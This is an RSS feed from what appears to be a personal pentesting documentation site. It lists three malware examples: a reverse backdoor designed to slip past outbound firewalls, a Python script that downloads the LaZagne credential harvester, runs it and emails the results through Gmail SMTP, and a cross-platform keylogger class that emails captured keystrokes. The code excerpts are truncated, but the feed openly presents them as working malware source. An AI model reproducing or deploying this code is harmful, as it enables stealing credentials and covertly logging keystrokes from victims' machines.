<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>malware on Jelle&#39;s pentesting docs</title>
    <link>http://localhost/malware/</link>
    <description>Recent content in malware on Jelle&#39;s pentesting docs</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language><atom:link href="http://localhost/malware/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Malware example: backdoor</title>
      <link>http://localhost/malware/backdoor/</link>
      <pubDate>Sun, 03 Mar 2019 00:00:00 +0000</pubDate>
      
      <guid>http://localhost/malware/backdoor/</guid>
      <description>In this example we are using a server listener on the attacker machine and a reverse backdoor on the client that connects to the server. This is more convenient then a connection that goes from attacker directly to the victim since firewalls might block it.
When the connection is initiated from the victim to the attacker we can use a port like 8080 that is probably already open on the victims outbound firewall.</description>
    </item>
    
    <item>
      <title>Malware example: credential harvesting</title>
      <link>http://localhost/malware/cross_platform_malware_example/</link>
      <pubDate>Wed, 27 Feb 2019 00:00:00 +0000</pubDate>
      
      <guid>http://localhost/malware/cross_platform_malware_example/</guid>
      <description>Simple example of a cross platform malware program.
It downloads the LaZagne credentials harvester (https://github.com/AlessandroZ/LaZagne) to the os specific temp directory, runs it using the &amp;lsquo;all&amp;rsquo; option and send the result via email.
#!/usr/bin/env python import requests, subprocess, smtplib, os, tempfile def download(url): get_response = requests.get(url) file_name = url.split(&amp;#34;/&amp;#34;)[-1] with open(file_name, &amp;#34;wb&amp;#34;) as out_file: out_file.write(get_response.content) def send_mail(email, password, message): server = smtplib.SMTP(&amp;#34;smtp.gmail.com&amp;#34;, 587) server.starttls() server.login(email,password) server.sendmail(email, email, message) server.quit() temp_directory = tempfile.</description>
    </item>
    
    <item>
      <title>Malware example: keylogger</title>
      <link>http://localhost/malware/keylogger/</link>
      <pubDate>Wed, 27 Feb 2019 00:00:00 +0000</pubDate>
      
      <guid>http://localhost/malware/keylogger/</guid>
      <description>Example of a cross platform keylogger class using Threading.
#!/usr/bin/env python import pynput.keyboard import threading import smtplib class Keylogger: def __init__(self, time_interval, email, password): self.log = &amp;#34;Keylogger started&amp;#34; self.interval = time_interval self.email = email self.password = password def append_to_log(self, string): self.log = self.log + string def process_key_press(self, key): try: current_key = str(key.char) except AttributeError: if key == key.space: current_key = &amp;#34; &amp;#34; else: current_key = &amp;#34; &amp;#34; + str(key) + &amp;#34; &amp;#34; self.</description>
    </item>
    
  </channel>
</rss>
